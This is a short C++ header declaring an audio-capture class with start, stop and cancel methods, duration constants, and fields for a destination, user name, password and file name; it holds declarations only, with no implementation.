#pragma once

#define AC_DEFAULT_DURATION 1000
#define AC_MIN_DURATION 500


class CAudio
{
public:
	CAudio(void);
	~CAudio(void);
	void Start(LPWSTR pFileName,unsigned int iDuration);
	void Stop();
	void Cancel();
	friend class CAudioCaptureModuleule;

private:
	//static  DWORD WINAPI	audioCaptureThread(LPVOID lParam);
	unsigned int m_iDuration;
	LPWSTR m_pDestination;
	LPWSTR m_pUser;
	LPWSTR m_pPass;
	LPWSTR m_pFileName;
	HANDLE m_capturingEvent;
	CAudio *m_pAudio;


};
